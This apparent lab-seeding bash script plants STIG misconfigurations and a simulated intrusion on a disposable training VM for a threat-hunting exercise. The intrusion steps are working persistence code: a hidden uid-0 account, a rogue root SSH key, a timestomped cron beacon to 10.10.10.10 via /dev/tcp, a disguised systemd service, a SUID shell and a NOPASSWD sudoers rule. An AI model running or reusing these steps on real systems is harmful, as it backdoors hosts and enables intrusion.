#!/usr/bin/env bash
# Seed STIG misconfigurations and a hidden intrusion on the DISPOSABLE range VM acd-target-01.
# Run as root on the VM only. Never on a real host. Reset with the VMware snapshot "clean".
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "run as root"; exit 1; }
[[ "$(hostname)" == acd-target-* ]] || { echo "refusing: hostname is not acd-target-*"; exit 1; }

log() { printf '[seed] %s\n' "$*"; }
STASH=/usr/local/lib/.cache
mkdir -p "$STASH"

# ---------- STIG misconfigurations (OpenSCAP catches these) ----------
log "M1 sshd PermitRootLogin yes (RHEL-09-255045)"
sed -i 's/^\s*#\?\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
grep -q '^PermitRootLogin' /etc/ssh/sshd_config || echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config

log "M2 sshd PermitEmptyPasswords yes (RHEL-09-255040)"
grep -q '^PermitEmptyPasswords' /etc/ssh/sshd_config \
  && sed -i 's/^PermitEmptyPasswords.*/PermitEmptyPasswords yes/' /etc/ssh/sshd_config \
  || echo 'PermitEmptyPasswords yes' >> /etc/ssh/sshd_config
systemctl restart sshd

log "M3 /etc/shadow mode 0644 (RHEL-09-232245)"
chmod 0644 /etc/shadow

log "M4 firewalld disabled (RHEL-09-251010)"
systemctl disable --now firewalld 2>/dev/null || true

log "M5 ctrl-alt-del.target unmasked (RHEL-09-211045)"
systemctl unmask ctrl-alt-del.target 2>/dev/null || true

log "M6 world-writable log dir (RHEL-09-232xxx family)"
chmod 0777 /var/log/acd-seed-dir 2>/dev/null || { mkdir -p /var/log/acd-seed-dir && chmod 0777 /var/log/acd-seed-dir; }

# ---------- Hidden intrusion (hunt module catches these; STIG scan does not) ----------
log "I1 second uid-0 account svc_backup"
id svc_backup &>/dev/null || useradd -o -u 0 -g 0 -d /root -s /bin/bash svc_backup
echo 'svc_backup:Backup2026!' | chpasswd

log "I2 rogue root authorized_keys entry"
mkdir -p /root/.ssh && chmod 700 /root/.ssh
ssh-keygen -q -t ed25519 -N '' -C 'jenkins@build-02' -f "$STASH/.k" <<<y >/dev/null 2>&1 || true
cat "$STASH/.k.pub" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

log "I3 cron persistence + beacon script (timestomped)"
cat > "$STASH/update.sh" <<'EOS'
#!/bin/bash
# "system update helper"
exec 3<>/dev/tcp/10.10.10.10/8443 2>/dev/null && echo "$(hostname) $(id -u)" >&3 || true
EOS
chmod 755 "$STASH/update.sh"
echo '*/5 * * * * root /usr/local/lib/.cache/update.sh >/dev/null 2>&1' > /etc/cron.d/.sysupdate
touch -d '2024-01-15 03:22:00' "$STASH/update.sh" /etc/cron.d/.sysupdate

log "I4 systemd persistence: kworkerd.service listening on 4444"
cat > /etc/systemd/system/kworkerd.service <<'EOS'
[Unit]
Description=Kernel worker daemon
After=network.target
[Service]
ExecStart=/usr/bin/python3 -m http.server 4444 --directory /usr/local/lib/.cache
Restart=always
[Install]
WantedBy=multi-user.target
EOS
systemctl daemon-reload && systemctl enable --now kworkerd.service

log "I5 SUID bash copy"
cp /bin/bash "$STASH/.b" && chmod 4755 "$STASH/.b"

log "I6 sudoers drop-in NOPASSWD for svc account"
echo 'svc_backup ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/90-backup && chmod 440 /etc/sudoers.d/90-backup

log "done. Take VMware snapshot 'seeded' now."
